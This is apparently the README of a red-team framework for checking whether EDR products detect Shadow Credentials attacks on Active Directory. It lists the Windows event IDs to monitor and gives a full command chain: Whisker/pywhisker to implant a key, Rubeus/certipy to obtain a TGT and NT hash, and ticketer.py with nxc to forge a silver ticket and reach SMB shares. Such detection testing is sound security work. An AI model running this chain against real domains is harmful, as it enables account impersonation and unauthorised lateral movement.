# Shadow Credentials EDR Verification Framework

## Philosophy
"Good taste means eliminating special cases."

This repository contains a pragmatic, minimal-impact framework for verifying Endpoint Detection and Response (EDR) capabilities against **Shadow Credentials** attacks. We do not deal in theoretical threats; we deal in practical, observable artifacts that any competent security product should detect.

## Core Concept
Shadow Credentials (msDS-KeyCredentialLink) allow an attacker to authenticate as a machine or user without knowing their password or NTHash. This is done by pushing a raw public key certificate into the target's `msDS-KeyCredentialLink` attribute and then using PKINIT to obtain a TGT.

This attack vector is **silent** (no password change), **persistent** (certificates have long validity), and **effective**.

## Quick Start
- New to this topic? Follow the step-by-step guide: [step by step.md](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/step%20by%20step.md)
- Full validation procedure: [EDR_VALIDATION_PROCEDURE - 複製.md](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/EDR_VALIDATION_PROCEDURE%20-%20複製.md)
- Run the DC-side validator: [Validate-ShadowCredentialsEDR.ps1](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/Validate-ShadowCredentialsEDR.ps1)

## Verification Scope
We focus on the critical path. If you can't detect the modification of the directory service or the subsequent anomalous authentication, your EDR is decoration, not protection.

### Key Events
1.  **Event 5136**: Directory Service Object Modified (The "Implant").
    -   Attribute: `msDS-KeyCredentialLink`
    -   Object Class: `computer` or `user`
2.  **Event 4768**: Kerberos Authentication Ticket (TGT) Request (The "Harvest").
    -   Pre-Auth Type: `14` (PKINIT) / `16`
    -   Certificate Information: Present
3.  **Event 4769**: Kerberos Service Ticket Request (The "Forge/Use").
    -   Encryption Type: `0x12` (AES) or `0x17` (RC4)
4.  **Event 5145**: Network Share Object Access (The "Access").
    -   Access Mask: `0x1` (ReadData) or similar.

## Prerequisites
-   **Target**: Windows Server 2016+ or Windows 10/11 (Domain Joined).
-   **Attacker**:
    -   Windows: `Whisker.exe`, `Rubeus.exe`
    -   Linux: `pywhisker`, `certipy`, `ticketer.py`, `nxc` (NetExec)
-   **Privileges**: Account with `GenericAll` or `WriteProperty` on the target object.

## Usage

### 1. Implant (The Injection)
Modify the AD object to trust our key.

**Windows (Whisker):**
```powershell
Whisker.exe add /target:TARGET$ /domain:domain.local /dc:DC01 /path:shadow.pfx /password:S3cr3t
```

**Linux (pywhisker):**
```bash
proxychains pywhisker -d domain.local -u User -p Pass -t TARGET$ --action add
```

### 2. Authenticate (The Exchange)
Trade the certificate for a TGT and NTHash.

**Windows (Rubeus):**
```powershell
Rubeus.exe asktgt /user:TARGET$ /certificate:shadow.pfx /password:S3cr3t /getcredentials /nowrap
```

**Linux (certipy):**
```bash
proxychains certipy auth -pfx shadow.pfx -dc-ip 10.0.0.1 -domain domain.local
```

### 3. Lateral Movement (The Access)
Use the ticket or hash to access resources.

**Linux (Silver Ticket + SMB):**
```bash
# Forge Silver Ticket
ticketer.py -nthash <HASH> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator

# Access
export KRB5CCNAME=Administrator.ccache
nxc smb target.domain.local -k --use-kcache
```

## Known Issues
-   **Network Isolation**: `nxc` or `lsassy` may fail with `No route to host` if the proxy/VPN is unstable.
-   **KDC Certs**: Ensure the DC has a valid KDC certificate. If not, you will see `KDC_ERR_PADATA_TYPE_NOSUPP`. Use the provided `kdc_pkinit_check.ps1` to diagnose.

## Contributing
Don't break userspace.
Keep it simple.
If it requires more than 3 levels of indentation, rewrite it.
